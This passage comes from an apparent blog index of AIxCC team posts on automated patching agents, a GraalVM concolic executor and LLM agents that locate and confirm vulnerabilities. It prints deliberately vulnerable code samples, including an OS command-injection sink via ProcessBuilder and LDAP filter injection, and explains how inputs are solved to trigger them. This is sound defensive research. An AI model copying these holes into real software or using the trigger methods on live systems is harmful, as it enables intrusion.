addressed the same vulnerability. If then, we skip that PoV to avoid redundant work.\nSecond, we also need to deduplicate patches. In the ensemble approach, multiple agents may generate the (semantically) same patch for a given vulnerability. To avoid submitting duplicate patches, we implemented a patch deduplication mechanism. When a patch is generated, we check whether another patch has already been submitted for that vulnerability. If it has, we discard the duplicate patch and only keep unique ones.\nMitigate Plausible but Incorrect Patches One of the biggest challenges in automated patching is dealing with plausible but incorrect patches. This is particularly problematic in the AIxCC competition, where submitting an incorrect patch can lead to penalties. To mitigate this risk, we use the following strategies:\nPrompt Engineering: We carefully designed prompts to encourage agents to generate accurate and reliable patches. This includes providing clear instructions, examples of correct patches, and emphasizing the importance of correctness over plausibility. We also included specific guidelines about common pitfalls. In the following, we provide an example prompt used in the multi_retrieval agent: # packages/crete/framework/agent/services/multi_retrieval/nodes/patchers/system_guided_patcher.py ... ## Important Notes for Patching - Try to provide all the patches needed to patch from the initial codebase. - The harness code is not the root cause and it serves as an entry point for the fuzzer to test the codebase. - The fuzzing can be done by some APIs which are not the root cause of the issue. It is just a way to trigger the issue in the codebase. - Do NOT fix fuzzing logic or harness code related files, functions, definitions, macros, or flags to bypass the issue. (Usually include words like \u0026#34;fuzz\u0026#34;, \u0026#34;harness\u0026#34;, \u0026#34;test\u0026#34;, etc.) - If additional issue is reported only in the harness code, this means that the last patch attempt did not resolve the issue correctly. - Modifying the fuzzing logic or harness code is strictly prohibited. They are the tests to be passed by fixing the codebase. - Do NOT modify or fix any test codes. The patched code must not break the existing tests and functionalities. - Do not remove a functionality to bypass the issue. Removal only patch is only allowed for mallicious code. - Do NOT modify error handling code to catch too broad exceptions. \u0026#34;\u0026#34;\u0026#34; Re-validation: After a patch is generated, we also re-validate it in the Main Node to ensure that it effectively resolves the vulnerability. Unlike the prompt engineering approach, this validation step is more reliable as it uses systematic testing to confirm the patch\u0026rsquo;s validity. In particular, we checked whether patches can be successfully applied and whether the vulnerability can still be triggered after applying the patch. Unlike the agen\u0026rsquo;s validation, which uses diverse optimizations to quickly validate patches, the Main Node\u0026rsquo;s validation is more conservative. That is, we used scripts provided by the AIxCC organizers and just run them without any modifications. By doing so, we can mitigate the risk of making mistakes during maintaining multiple agents and ensure that only correct patches are submitted. Crete, the Patching Island If we attempt to maximize the effectiveness of our ensemble approach, we need to build diverse agents that can complement each other. This requires a development framework that allows us to rapidly prototype and test new agents. To this end, we built Crete, a custom development framework for efficient agent development. Crete provides a set of tools and abstractions that simplify the process of building, testing, and deploying agents. This makes contributors focus only on the core logic of their agents, rather than dealing with boilerplate code or infrastructure.\nThese are some of the key features that Crete offers:\nOSS-Fuzz Integration: Crete supports a unified interface that wraps OSS-Fuzz, allowing agents to interact with it without needing to know its internal details. It provides simple APIs for applying patches, building the target, and checking whether the patch succeeds, making integration straightforward for each agent.\nRepository Code Search: Crete also includes built-in code search capabilities. As patching often requires understanding the context of the codebase, Crete provides tools to quickly search and navigate repository code, helping developers locate vulnerable areas and apply patches more effectively.\nContext Extraction: Crete also offers utilities for automatically extracting relevant information to be included in prompts. This includes collecting crash logs, debugging traces, and commit history, among other data sources. By standardizing how this information is gathered and formatted, agents can focus on reasoning and patch generation rather than data wrangling.\nOptimizations: Crete incorporates several optimizations to enhance performance. For instance, it caches build artifacts to avoid redundant compilations, which can be time-consuming. It also provides caching mechanisms for frequently accessed data (e.g., crash logs) to reduce latency. These optimizations help to speed up the patching process, allowing agents to iterate more quickly and efficiently.\nConclusion In this blog post, we discussed the challenges of automated patching in the AIxCC competition and how we addressed them using an ensemble of specialized agents. By adopting this approach, we were able to build a robust and effective patching system that can handle a wide variety of vulnerabilities.\nIn upcoming posts, we’ll dive deeper into individual agents\u0026mdash;how each was designed, what types of vulnerabilities they target, and how they complement each other within the ensemble. Stay tuned for more insights into our patching strategies and techniques!\n"},{"section":"Blog","slug":"/blog/post-crs-java-concolic/","title":"Our GraalVM Executor: How We Achieved Compatibility, Scale, and Speed","description":"How our custom GraalVM concolic executor overcomes the instability of traditional tools to enhance fuzzing to find vulnerabilities in Java","date":"September 29, 2025","image":"\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n  \n\n\n\n\n\n  \n\n  \n  \n    \n      \n    \n\n\n    \n    \n\n\n    \n    \n      \n      \n    \n    \n    \n\n\n    \n    \n      \n      \n        \n        \n        \n        \n        \n        \n\n\n        \n        \n\n\n        \u003cimg\n          \n            src=\"/images/blog/crs-java/concolic/icon_hu_b00fae447104a333.webp\" loading=\"lazy\" decoding=\"async\"\n          \n\n          alt=\"\"\n          class=\"  img\"\n          width=\"420\"\n          height=\"280\"\n          onerror=\"this.onerror='null';this.src='\\/images\\/blog\\/crs-java\\/concolic\\/icon_hu_359bb94bc73bf483.png';\" /\u003e\n\n        \n      \n      \n    \n    \n  \n\n\n  \n","imageSM":"\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n  \n\n\n\n\n\n  \n\n  \n  \n    \n      \n    \n\n\n    \n    \n\n\n    \n    \n      \n      \n    \n    \n    \n\n\n    \n    \n      \n      \n        \n        \n        \n        \n        \n        \n          \n          \n          \n          \n        \n\n\n        \n        \n\n\n        \u003cimg\n          \n            src=\"/images/blog/crs-java/concolic/icon_hu_1248f0948121e556.webp\" loading=\"lazy\" decoding=\"async\"\n          \n\n          alt=\"\"\n          class=\"  img\"\n          width=\"100\"\n          height=\"100\"\n          onerror=\"this.onerror='null';this.src='\\/images\\/blog\\/crs-java\\/concolic\\/icon_hu_5ca41cc93c271fc8.png';\" /\u003e\n\n        \n      \n      \n    \n    \n  \n\n\n  \n","searchKeyword":"","categories":"Atlantis-Java","tags":"java, concolic execution, graalvm, espresso, jazzer","content":"In the AIxCC competition, while fully committing to the challenge of leveraging Large Language Models (LLMs), we also integrated traditional techniques to create a more robust bug-finding system with fewer blind spots.\nThe competition provided a baseline fuzzer (Jazzer for Java projects), but coverage-guided fuzzing in general often struggles with the complex validation logic that guards deep code paths. To address this, concolic execution is a well-known solution for exploring these paths by solving their input conditions. Our main challenge, therefore, was how to effectively leverage this powerful technique for the competition\u0026rsquo;s bug-finding goals.\nWhy a New Java Concolic Engine? This proved more challenging than anticipated. We found that while many existing Java concolic engines were powerful in theory, applying them to the competition\u0026rsquo;s demands revealed a fundamentally unstable foundation. These issues made them unsuitable for our purposes:\nOutdated Java Support: Many existing tools only supported older Java versions (like 8 or 11), making them incompatible with the modern applications we needed to analyze. Foundational Instability: The primary issue was a deep-seated instability stemming from two sources. At a low level, their core bytecode instrumentation method often clashed with essential Java features like class initialization (\u0026lt;clinit\u0026gt;) or lambda expressions, causing the tool to crash on perfectly valid code. At a high level, they were fragile when faced with real-world applications that use native methods or complex external libraries, which require time-consuming and error-prone manual modeling. This combined instability meant the analysis could fail unpredictably, making the tools fundamentally unreliable—akin to building castles on sand. Significant Performance Overhead: Concolic execution is inherently resource-intensive—a fundamental challenge for any implementation. A key goal for us was to mitigate this overhead as much as possible for the competition\u0026rsquo;s tight time constraints. These obstacles motivated us to build a new concolic executor from the ground up, one aimed at being robust, compatible, and performant enough for the demands of the competition.\nOur Approach: Interpreter-Based Symbolic Emulation Fig.1 High-level overview of our Concolic Executor\nTo overcome the critical issues of bytecode instrumentation, we built our engine on GraalVM Espresso, a high-performance, JIT-compiled bytecode interpreter. This interpreter-level approach gave us several key advantages:\nCompatibility Without Instrumentation: By operating at the bytecode level, we can hook into every execution step without modifying the target program\u0026rsquo;s code, ensuring compatibility with the latest Java versions. State Isolation: Our symbolic analysis runs in a completely isolated context. The target application is entirely unaware of the symbolic state tracking, which prevents the contamination issues that plague static instrumentation methods. JIT-Accelerated Performance: Symbolic execution adds overhead. Our engine leverages GraalVM\u0026rsquo;s Just-In-Time (JIT) compiler to mitigate this. After a code path is executed once, it\u0026rsquo;s JIT-compiled, making subsequent runs—for both the program and our symbolic emulation—execute at near-native speed. What We Focused On To be effective alongside fuzzers like Jazzer, our executor needed to excel at two things: reaching sinks and triggering bugs. To achieve this, our engine collects path constraints during execution and uses the Z3 solver to generate new inputs that either guide the fuzzer toward unexplored code (exploration) or satisfy the precise conditions needed to trigger a vulnerability (exploitation).\nFor Exploration: Reaching the Unreachable In mature fuzzing campaigns, fuzzers can get \u0026ldquo;stuck\u0026rdquo; repeatedly exploring the same regions of code without making new discoveries. Our concolic executor addresses this by recording the path constraints that lead to these stuck points, negating them, and using the Z3 solver to generate new inputs that bypass the roadblock.\nThis new input then guides the fuzzer to explore previously unreachable code blocks, significantly improving coverage even on corpora from long-running fuzz campaigns. By systematically navigating past these difficult barriers, we increase our chances of reaching new, security-sensitive sinks.\nFor Exploitation: Triggering Vulnerabilities Sometimes a fuzzer successfully reaches a sensitive API (a sink) but fails to provide the specific input needed to trigger the vulnerability. This is where our executor shines as an \u0026ldquo;exploit assistant\u0026rdquo;.\nExample: OutOfMemoryError\nIn an Apache Commons Compress challenge, a vulnerability could be triggered by allocating an enormous array, causing an OutOfMemoryError. The allocation size was determined by complex calculations based on the input.\nprotected void initializeTables(final int maxCodeSize) { ... if (1 \u0026lt;\u0026lt; maxCodeSize \u0026lt; 256 || getCodeSize() \u0026gt; maxCodeSize) { throw new IllegalArgumentException(\u0026#34;maxCodeSize \u0026#34; + maxCodeSize + \u0026#34; is out of bounds.\u0026#34;); } final int maxTableSize = 1 \u0026lt;\u0026lt; maxCodeSize; prefixes = new int[maxTableSize]; // Out-Of-Memory characters = new byte[maxTableSize]; // Out-Of-Memory outputStack = new byte[maxTableSize]; // Out-Of-Memory outputStackLocation = maxTableSize; // Out-Of-Memory Our engine identified the array allocation bytecode (NEWARRAY) and used Z3\u0026rsquo;s Optimize feature to find an input that both satisfied all path conditions and maximized the allocation size, demonstrating the ability to reliably trigger the OOM error.\nExample: OS Command Injection\nSince our executor works alongside Jazzer, it can leverage Jazzer\u0026rsquo;s bug detectors, which often look for specific sentinel values. For command injection, Jazzer\u0026rsquo;s detector reports a finding when the executable name is equal to \u0026quot;jazze\u0026quot;.\nfinal DataInput inData = new DataInputStream(in); // Input final int method = inData.readUnsignedByte(); if (method != Deflater.DEFLATED) { // Validation 1 throw new IOException(\u0026#34;Unsupported compression method \u0026#34; + method + \u0026#34; in the .gz header\u0026#34;); } final int flg = inData.readUnsignedByte(); if ((flg \u0026amp; GzipUtils.FRESERVED) != 0) { // Validation 2 throw new IOException(\u0026#34;Reserved flags are set in the .gz header.\u0026#34;); } long modTime = ByteUtils.fromLittleEndian(inData, 4); ... String fname = null; if ((flg \u0026amp; GzipUtils.FNAME) != 0) { // Validation 3 fname = new String(readToNull(inData), parameters.getFileNameCharset()); parameters.setFileName(fname); } if (modTime == 1731695077L \u0026amp;\u0026amp; fname != null) { // Validation 4 new ProcessBuilder(fname).start(); // Sink } Fuzzers often struggle to generate this exact string when it\u0026rsquo;s constructed after multiple transformations or guarded by the validation checks shown above. Our solution was to add a simple constraint once the ProcessBuilder sink was reached: that the executable name must equal \u0026quot;jazze\u0026quot;. The Z3 solver could then handle the complexity of satisfying this goal while also passing all other path conditions.\nThus, by combining the broad reach of fuzzing with the deep, targeted analysis of our solver-powered concolic executor, Atlantis-Java strengthened its ability to uncover vulnerabilities that were deeper and more complex than either technique could find alone.\nReference Atlantis-Java Code Repository Technical Report "},{"section":"Blog","slug":"/blog/post-mlla-bcda/","title":"BCDA: The AI Detective Separating Real Bugs from False Alarms","description":"A deep dive into BCDA, the AI agent that acts as a detective, analyzing potential vulnerability paths to distinguish genuine threats from false positives and creating detailed bug reports for exploitation.","date":"September 7, 2025","image":"\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n  \n\n\n\n\n\n  \n\n  \n  \n    \n      \n    \n\n\n    \n    \n\n\n    \n    \n      \n      \n    \n    \n    \n\n\n    \n    \n      \n      \n        \n        \n        \n        \n        \n        \n\n\n        \n        \n\n\n        \u003cimg\n          \n            src=\"/images/blog/mlla/bcda_preview_hu_d0ce409de47a444a.webp\" loading=\"lazy\" decoding=\"async\"\n          \n\n          alt=\"\"\n          class=\"  img\"\n          width=\"420\"\n          height=\"420\"\n          onerror=\"this.onerror='null';this.src='\\/images\\/blog\\/mlla\\/bcda_preview_hu_7d1fb312bea7416b.png';\" /\u003e\n\n        \n      \n      \n    \n    \n  \n\n\n  \n","imageSM":"\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n  \n\n\n\n\n\n  \n\n  \n  \n    \n      \n    \n\n\n    \n    \n\n\n    \n    \n      \n      \n    \n    \n    \n\n\n    \n    \n      \n      \n        \n        \n        \n        \n        \n        \n          \n          \n          \n          \n        \n\n\n        \n        \n\n\n        \u003cimg\n          \n            src=\"/images/blog/mlla/bcda_preview_hu_8ebf92d37c6955cb.webp\" loading=\"lazy\" decoding=\"async\"\n          \n\n          alt=\"\"\n          class=\"  img\"\n          width=\"100\"\n          height=\"100\"\n          onerror=\"this.onerror='null';this.src='\\/images\\/blog\\/mlla\\/bcda_preview_hu_5888836c74fe8e4a.png';\" /\u003e\n\n        \n      \n      \n    \n    \n  \n\n\n  \n","searchKeyword":"","categories":"Atlantis-Multilang","tags":"mlla, llm, vulnerability-discovery, static-analysis, multi-agent, bcda","content":"🎯 From Potential Sink to Actionable Intelligence BCDA (Bug Candidate Detection Agent)\u0026rsquo;s core mission is to address the fundamental challenge of lightweight sink analysis: distinguishing real vulnerabilities from false-positive noise. When MCGA, our cartographer, flags a function containing a potentially vulnerable \u0026ldquo;sink\u0026rdquo; (such as a function that executes system commands), BCDA takes over.\nIts job isn\u0026rsquo;t just to say \u0026ldquo;yes\u0026rdquo; or \u0026ldquo;no.\u0026rdquo; BCDA performs a deep, multi-stage investigation powered by LLMs to produce a Bug Inducing Thing (BIT). A BIT is a high-fidelity, structured report detailing a confirmed vulnerability candidate. It includes the exact location, the specific trigger conditions (like if-else branches), and a detailed analysis generated by LLMs. This report becomes a detailed guide for our demolition expert, BGA, and the fuzzing stages.\nTo get there, BCDA follows a rigorous, four-step investigative process.\nStep 1: 🔍 Path Expansion and Pruning (Gathering the Evidence) A simple call stack is like a list of locations a suspect has visited: it shows where they\u0026rsquo;ve been, but not what they did there or who else was involved. It often misses crucial context from functions outside the direct call chain, such as utility or validation functions.\nBCDA starts by expanding the execution path. It receives the call path from the source (typically the harness) to the sink (flagged by MCGA) and uses Tree-sitter-based parsing to identify every single function call made along that path. This expanded set of functions is then provided to an LLM.\nBut more data isn\u0026rsquo;t always better. To avoid analyzing irrelevant code, BCDA immediately applies LLM-powered pruning. Since MCGA already hints at the type of vulnerability (e.g., Command Injection, XXE, Path Traversal), BCDA asks the LLM: “Of all these functions, which ones are truly relevant to this vulnerability type?”\nThe LLM responds with only the necessary functions, leaving BCDA with a rich but focused context for its investigation.\nStep 2: 🕵️ Vulnerability Classification (The Interrogation) With the relevant code path established, BCDA begins its interrogation. BCDA constructs a sanitizer-specific prompt for the LLM. This isn\u0026rsquo;t a generic question; it\u0026rsquo;s a highly detailed briefing that includes:\nA clear explanation of the suspected vulnerability type. Common coding patterns and anti-patterns associated with that vulnerability. Effective strategies for detecting it in source code. For example, when analyzing LDAP injection, BCDA provides this specific guidance:\n\u0026lt;sanitizer\u0026gt; \u0026lt;type\u0026gt;LDAPInjection\u0026lt;/type\u0026gt; \u0026lt;description\u0026gt; LDAP queries constructed by concatenating unescaped user input. Find: String concatenation building LDAP DN or filters, including multi-valued RDNs. ```java String username = request.getParameter(\u0026#34;user\u0026#34;); String dn = \u0026#34;cn=\u0026#34; + username + \u0026#34;,dc=example,dc=com\u0026#34;; // BUG: unescaped dirContext.search(dn, attrs); // Filter context String filter = \u0026#34;(uid=\u0026#34; + username + \u0026#34;)\u0026#34;; // BUG: unescaped filter dirContext.search(baseDN, filter, controls); ``` \u0026lt;/description\u0026gt; \u0026lt;/sanitizer\u0026gt; Armed with this vulnerability domain knowledge and the expanded-and-pruned code path, the LLM analyzes the code path and makes a definitive judgment: does this path contain the suspected vulnerability, or is it a false alarm?\nFor more details on how we prepare and implement context engineering for vulnerability detection, check out our Domain Knowledge Integration technique.\nStep 3: 🔑 Key Condition and Trigger Path Extraction (Reconstructing the Crime) If the LLM confirms a vulnerability, BCDA\u0026rsquo;s most critical task begins: identifying the key conditions required to trigger it. A bug is useless if you can\u0026rsquo;t reach it. BCDA needs to find the exact sequence of if statements, try-catch blocks, and other conditional logic that unlocks the path to the vulnerable code.\nInstead of overwhelming the LLM with the entire path at once, BCDA analyzes it transition by transition. It focuses on one function call at a time, asking the LLM: \u0026ldquo;To get from function A to function B, what conditions must be true?\u0026rdquo;\nThis granular, step-by-step approach allows the LLM to focus its analysis and accurately identify critical decision points. For example, it might determine that an if (user.isAdmin()) check must evaluate to true or that control must flow into a catch (Exception e) block to reach the sink.\nStep 4: 📝 BIT Generation (Filing the Case Report) The investigation concludes with the creation of a Bug Inducing Thing (BIT). This isn\u0026rsquo;t just a simple alert; it\u0026rsquo;s a structured data object, optimized for the next stages of our pipeline.\nEach BIT contains everything an exploitation agent needs to know:\nVulnerability Type: The class of the bug (e.g., COMMAND_INJECTION). Location: The exact file path and line numbers. Key Conditions: A list of all branch conditions that must be satisfied. Analysis Messages: A log of the LLM\u0026rsquo;s reasoning from each step. Priority Level: A score based on factors like how recently the code was changed. This structured report is then passed to BGA (Blob Generation Agent) and our fuzzers. Armed with a BIT, BGA and our fuzzers receive a confirmed, detailed blueprint for crafting a precise and effective exploit.\n📋 What BCDA Actually Analyzes: A Real Example Here\u0026rsquo;s the actual source code BCDA analyzes when investigating an LDAP injection vulnerability in Jenkins from our benchmark. We use the same annotation system described in our context engineering source code annotations:\n/* @KEY_CONDITION */ marks conditions that must be satisfied to reach the vulnerability /* @BUG_HERE */ identifies the exact location of the vulnerable code Entry Point (Harness):\n// fuzzerTestOneInput - where the fuzz data enters public static void fuzzerTestOneInput(byte[] data) throws Exception { BugDetectors.allowNetworkConnections((host, port) -\u0026gt; host.equals(\u0026#34;localhost\u0026#34;)); new JenkinsThree().fuzz(data); } Routing Logic with Key Conditions:\npublic void fuzz(byte[] data) throws Exception { ByteBuffer buf = ByteBuffer.wrap(data); if (buf.remaining() \u0026lt; 4) { /* @KEY_CONDITION */ return; } int picker = buf.getInt(); switch (picker) { /* @KEY_CONDITION */ case 190: /* @KEY_CONDITION */ testAuthAction(buf); break; // ... other cases } } Input Processing:\nvoid testAuthAction(ByteBuffer buf) { String[] parts = getRemainingAsString(buf).split(\u0026#34;\\0\u0026#34;); if (parts.length != 4) { /* @KEY_CONDITION */ return; } // Mock request with user-controlled parameters when(innerReq.getParameter(parts[0])).thenReturn(parts[1]); when(innerReq.getParameter(parts[2])).thenReturn(parts[3]); // ... action.authenticateAsAdmin(req, rsp); } The Vulnerable Sink:\npublic void authenticateAsAdmin(StaplerRequest request, StaplerResponse response) throws IOException, NamingException { if (!request.hasParameter(\u0026#34;username\u0026#34;) || !request.hasParameter(\u0026#34;key\u0026#34;)) { /* @KEY_CONDITION */ response.sendError(HttpServletResponse.SC_BAD_REQUEST); return; } String username = request.getParameter(\u0026#34;username\u0026#34;); String key = request.getParameter(\u0026#34;key\u0026#34;); if (!isAdmin(dirContext, controls, username)) { /* @KEY_CONDITION */ writer.print(\u0026#34;{\\\u0026#34;status\\\u0026#34;: \\\u0026#34;failure\\\u0026#34;}\u0026#34;); return; } // THE VULNERABILITY: Unsanitized user input in LDAP filter String searchFilter = \u0026#34;(\u0026amp;(objectClass=inetOrgPerson)(cn=\u0026#34; + username + \u0026#34;)(userPassword=\u0026#34; + key + \u0026#34;))\u0026#34;; /* @BUG_HERE */ NamingEnumeration\u0026lt;SearchResult\u0026gt; results = dirContext.search(\u0026#34;ou=users,dc=example,dc=com\u0026#34;, searchFilter, controls); } BCDA Goes Deeper: Analyzing the isAdmin Gate But BCDA doesn\u0026rsquo;t stop at identifying isAdmin() as a key condition. It follows the execution path deeper to understand what conditions must be satisfied inside that function:\nprivate boolean isAdmin(DirContext dirContext, SearchControls controls, String name) throws NamingException { String searchFilter = \u0026#34;(\u0026amp;(objectClass=inetOrgPerson)(description=admin))\u0026#34;; try { NamingEnumeration\u0026lt;SearchResult\u0026gt; results = dirContext.search(\u0026#34;ou=users,dc=example,dc=com\u0026#34;, searchFilter, controls); while (results.hasMore()) { SearchResult result = results.next(); if (result.getAttributes().get(\u0026#34;cn\u0026#34;).get().equals(name)) { /* @KEY_CONDITION */ return true; } } } catch (Exception e) { } return false; } BCDA discovers that for isAdmin() to return true, two nested conditions must be met:\nThe LDAP search must return at least one admin user (results.hasMore()) One of those admin users must have a cn attribute matching the input username This depth of analysis is crucial. Many vulnerability detection tools would stop at the high-level isAdmin() check, missing the specific LDAP query conditions needed to bypass it.\nThis is exactly the kind of complex, multi-condition vulnerability path that BCDA excels at analyzing. Notice how the bug is buried behind multiple conditional checks, switch statements, and function calls. Traditional static analysis tools would struggle to map this complete execution path and identify the precise conditions needed to reach the vulnerability.\n✨ The BCDA Difference: From Guesswork to Certainty BCDA transforms the system from a heavy, resource-draining carpet-bombing approach into a \u0026lsquo;strategic vulnerability discovery platform\u0026rsquo; that precisely targets high-probability vectors and concentrates resources where they matter most.\nMCGA (Finds Leads) ➔ BCDA (Verifies \u0026amp; Details Leads) ➔ BGA (Exploitation Leads)\nBy filtering out false positives and enriching real vulnerabilities with precise trigger conditions, BCDA ensures that our most powerful and computationally expensive agent, BGA, focuses its efforts only on confirmed, high-value targets. It is the crucial link that turns MCGA\u0026rsquo;s broad surveillance into BGA\u0026rsquo;s surgical strike, saving time and improving the quality of discovered bugs.\nBCDA demonstrates that in automated security analysis, the goal isn\u0026rsquo;t just to find more potential bugs. It\u0026rsquo;s to find the right ones, armed with the intelligence needed to act on them.\n🔄 Forward vs. Backward Analysis: A Design Choice BCDA currently employs a forward analysis approach, following the software analyst\u0026rsquo;s mindset: starting from the entry point (harness code), following the call trace, and then finding the buggy point. This mirrors how traditional program analysis works: trace execution paths from known entry points to discover what might go wrong.\nBut there\u0026rsquo;s another perspective: the hacker\u0026rsquo;s approach. Security researchers often work backward. They first identify potentially vulnerable sinks (like system() calls, SQL query construction, or memory corrupting memcpy() or strcpy()), then trace backward through references to find if these sinks are reachable from user-controlled entry points.\nThis backward analysis has compelling advantages:\nEfficiency: Focus immediately on high-risk code patterns Coverage: Find vulnerabilities that might not be reachable through obvious execution paths Hacker mindset: Mirror how real attackers analyze code for weaknesses We experimented with implementing this backward tracing approach during the competition, starting from vulnerable sinks and following references back to entry points. However, we couldn\u0026rsquo;t complete this implementation within the competition timeframe.\nThe backward analysis remains an interesting direction for future research. Combining both forward and backward approaches could provide more comprehensive vulnerability coverage while maintaining BCDA\u0026rsquo;s precision in identifying exploitable conditions.\nNow, interested to see how BCDA\u0026rsquo;s results are used for self-evolving exploits? Check out 🛠️ BGA: Self-Evolving Exploits Through Multi-Agent AI.\nDive Deeper This was a look into our AI detective, BCDA. To see how MLLA components work together, check out our other deep dives:\n🌐 Browse the complete MLLA source code 🏗️ MLLA Overview: Teaching LLMs to Hunt Bugs Like Security Researchers 🗺️ Deep dive into CPUA, MCGA, CGPA\u0026rsquo;s code understanding and navigation 🛠️ Deep dive into BGA\u0026rsquo;s self-evolving exploits 🧠 Context Engineering: How BGA Teaches LLMs to Write Exploits "},{"section":"Blog","slug":"/blog/post-mlla-disc-agents/","title":"From Harness to Vulnerability: AI Agents for Code Comprehension and Bug Discovery","description":"","date":"September 4, 2025","image":"\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n  \n\n\n\n\n\n  \n\n  \n  \n    \n      \n    \n\n\n    \n    \n\n\n    \n    \n      \n      \n    \n    \n    \n\n\n    \n    \n      \n      \n        \n        \n        \n        \n        \n        \n\n\n        \n        \n\n\n        \u003cimg\n          \n            src=\"/images/blog/mlla/cpua_preview_hu_c6b9dae04664146.webp\" loading=\"lazy\" decoding=\"async\"\n          \n\n          alt=\"\"\n          class=\"  img\"\n          width=\"420\"\n          height=\"420\"\n          onerror=\"this.onerror='null';this.src='\\/images\\/blog\\/mlla\\/cpua_preview_hu_f330b0021751354e.png';\" /\u003e\n\n        \n      \n      \n    \n    \n  \n\n\n  \n","imageSM":"\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n  \n\n\n\n\n\n  \n\n  \n  \n    \n      \n    \n\n\n    \n    \n\n\n    \n    \n      \n      \n    \n    \n    \n\n\n    \n    \n      \n      \n        \n        \n        \n        \n        \n        \n          \n          \n          \n          \n        \n\n\n        \n        \n\n\n        \u003cimg\n          \n            src=\"/images/blog/mlla/cpua_preview_hu_21b7801606f6eaca.webp\" loading=\"lazy\" decoding=\"async\"\n          \n\n          alt=\"\"\n          class=\"  img\"\n          width=\"100\"\n          height=\"100\"\n          onerror=\"this.onerror='null';this.src='\\/images\\/blog\\/mlla\\/cpua_preview_hu_239404ac091d6f73.png';\" /\u003e\n\n        \n      \n      \n    \n    \n  \n\n\n  \n","searchKeyword":"","categories":"Atlantis-Multilang","tags":"mlla, llm, multi-agent","content":"Beneath the Exploit: The Groundwork That Makes Bug Hunting Possible When people hear about AI agents finding vulnerabilities, they often imagine the spectacular finale: an exploit payload triggering a crash, or a carefully crafted generator slipping past validation layers.\nBut here’s the truth: none of that would have been possible without groundwork laid by three quieter agents.\nBefore any exploit can be created, the system must answer harder, subtler questions:\nWhich functions in this ocean of code are worth exploring? How do they connect to one another? Where are the potential dangerous sinks? That’s the job of CPUA, CGPA, and MCGA — the scouts, librarians, and cartographers of the MLLA ecosystem. They don’t generate flashy exploits. Instead, they build the maps, catalogs, and entry points that make exploit generation possible.\nIn fact, if MCGA doesn’t detect a vulnerable sink, BCDA and BGA never even get triggered. This pipeline dependency means the exploit stage only happens because these three agents did their job first.\nWhy Code Comprehension Matters Imagine being dropped into a foreign city with millions of streets but no map. That’s what a raw codebase looks like to a fuzzer. You could wander aimlessly (traditional fuzzing), but you’ll likely never find the treasure. Instead, you need guides who can:\nScout entry points (harness functions that process input) Retrieve precise directions (resolve function definitions, signatures, and dependencies) Draw accurate maps (call graphs with danger zones clearly marked) That’s what CPUA, CGPA, and MCGA do. They are not about brute force; they are about intelligence in navigation.\n🎯 CPUA: The Scout If every heist needs someone to case the building first, CPUA (CP Understanding Agent) is that scout.\nInput: Harness file contents (the starting point of fuzzing). Output: A prioritized list of “interesting functions” that deserve attention. CPUA uses LLM reasoning to analyze harnesses, detect functions that handle untrusted input, and annotate them with metadata like:\nFunction names and locations Priority scores (e.g., fuzzed input vs. utility function) Tainted parameters This focus prevents wasted effort. Instead of traversing millions of functions, CPUA narrows the field to dozens that actually matter.\nStrengths:\nLanguage-independent (works for C, C++, Java, etc.) Can handle reflection-heavy harnesses (common in JVM projects) Limitations:\nIf the harness doesn’t expose critical functions (like in nginx), CPUA can’t surface them. Still, CPUA’s scouting ability sets the stage. Without it, later agents would drown in noise.\nHands-on Example:\n# Simplified CPUA flow (from cpua.py) def analyze_harness(harness_code: str) -\u0026gt; list[str]: funcs = extract_function_calls(harness_code) prioritized = rank_functions(funcs) # fuzzed input, tainted args return prioritized # Example harness snippet harness = \u0026#34;\u0026#34;\u0026#34; public void fuzzerTestOneInput(FuzzedDataProvider data) { String xml = data.consumeString(100); parseDocument(xml); // interesting helperLog(xml); // low priority } \u0026#34;\u0026#34;\u0026#34; print(analyze_harness(harness)) # Output: [\u0026#34;parseDocument\u0026#34;, \u0026#34;helperLog\u0026#34;] 📚 CGPA: The Librarian Once CPUA points at “interesting” functions, the next question is: where exactly are they, and what do they look like?\nThat’s the role of CGPA (Call Graph Parser Agent) — the meticulous librarian of the team.\nInput: Partial function info (e.g., just a function name, or callsite reference). Output: Full function definition (location, signature, body, caller/callee context). CGPA achieves this by orchestrating a suite of tools:\nJoern for deep static analysis and Code Property Graphs LSP (via multilspy, patched to support clangd for C/C++/Java) Ripgrep/AST-grep for syntax-aware code searching Code Indexer for fast cross-referencing If multiple candidates match, CGPA can even query the LLM to disambiguate.\nThink of it this way: if CPUA says “go check the room marked ‘processInput’,” CGPA is the one who fetches the blueprints and directions to the exact door, floor, and lock.\nHands-on Example:\n# Simplified CGPA query (from cgpa.py) def resolve_function(partial: str) -\u0026gt; dict: result = code_indexer.lookup(partial) if not result: result = lsp.find_definition(partial) if not result: result = joern.query(f\u0026#39;function.name=\u0026#34;{partial}\u0026#34;\u0026#39;) return result # Example: partial info = \u0026#34;parseDocument\u0026#34; print(resolve_function(\u0026#34;parseDocument\u0026#34;)) # Output: # { # \u0026#34;file\u0026#34;: \u0026#34;src/main/java/org/example/XMLParser.java\u0026#34;, # \u0026#34;signature\u0026#34;: \u0026#34;public void parseDocument(String xml)\u0026#34;, # \u0026#34;start_line\u0026#34;: 42, # \u0026#34;end_line\u0026#34;: 87 # } 🗺️ MCGA: The Cartographer Now comes the most ambitious of the trio: MCGA (Make Call Graph Agent). If CPUA is the scout and CGPA the librarian, MCGA is the cartographer — building maps of how code actually flows.\nInput: Function info (name, file, code, tainted args). Output: Structured call graph annotated with vulnerability info. MCGA works recursively:\nRoot Node Initialization – Starts from a target function (resolved via CGPA). Callee Extraction – Finds all callsites in the body. Vulnerable Sink Detection – Uses LLM reasoning to flag dangerous operations (e.g., system calls, unsafe deserialization). Callee Resolution – Queries CGPA to fetch precise info for each callee. Recursive Expansion – Builds subgraphs, detects cycles, and respects depth limits. Caching \u0026amp; Efficiency – Uses Redis + in-memory caches to prevent re-analysis. Structured Output – Returns a FuncInfo tree, each node annotated with sink detection reports. Hands-on Example:\n# From mcga.py def build_call_graph(fn: FuncInfo) -\u0026gt; FuncInfo: callees = extract_callees(fn.func_body) for callee in callees: 